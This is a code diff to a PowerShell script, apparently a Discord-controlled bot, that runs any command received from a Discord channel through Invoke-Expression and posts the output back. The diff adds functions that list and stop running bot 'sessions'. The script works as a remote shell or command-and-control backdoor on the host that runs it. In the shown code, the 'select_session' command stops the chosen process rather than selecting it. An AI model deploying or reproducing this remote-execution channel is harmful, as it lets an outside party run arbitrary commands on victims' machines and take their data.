@@ -40,22 +40,62 @@ function Send-DiscordMessage {
     }
 }
 
+# Function to list running PowerShell bot sessions
+function List-Sessions {
+    $processes = Get-Process -Name "powershell" | Where-Object {
+        $_.Path -like "*PowershellBot.ps1*"
+    }
+
+    if ($processes.Count -eq 0) {
+        return "No running bot sessions found."
+    }
+
+    $sessionList = ""
+    $processes | ForEach-Object {
+        $sessionList += "Session ID: $($_.Id) - Start Time: $($_.StartTime)`n"
+    }
+
+    return $sessionList
+}
+
+# Function to stop a specific bot session
+function Stop-Session {
+    param (
+        [string]$sessionId
+    )
+
+    $process = Get-Process -Id $sessionId -ErrorAction SilentlyContinue
+    if ($process) {
+        Stop-Process -Id $sessionId
+        return "Stopped session $sessionId."
+    } else {
+        return "Invalid session ID."
+    }
+}
+
 # Function to execute a PowerShell command
 function Execute-PowerShellCommand {
     param (
         [string]$command
     )
 
-    try {
-        # Run the PowerShell command and capture the output
-        $output = Invoke-Expression $command  # Runs the PowerShell command
-        if ($output) {
-            $result = $output -join "`n"  # Join multiline output for Discord message
-        } else {
-            $result = "Command executed successfully with no output."
+    if ($command -eq "list_sessions") {
+        $result = List-Sessions
+    } elseif ($command.StartsWith("select_session")) {
+        $sessionId = $command.Replace("select_session ", "")
+        $result = Stop-Session -sessionId $sessionId
+    } else {
+        try {
+            # Run the PowerShell command and capture the output
+            $output = Invoke-Expression $command  # Runs the PowerShell command
+            if ($output) {
+                $result = $output -join "`n"  # Join multiline output for Discord message
+            } else {
+                $result = "Command executed successfully with no output."
+            }
+        } catch {
+            $result = "Error executing command: $_"
         }
-    } catch {
-        $result = "Error executing command: $_"
     }
 
     # Limit output to a reasonable size for Discord
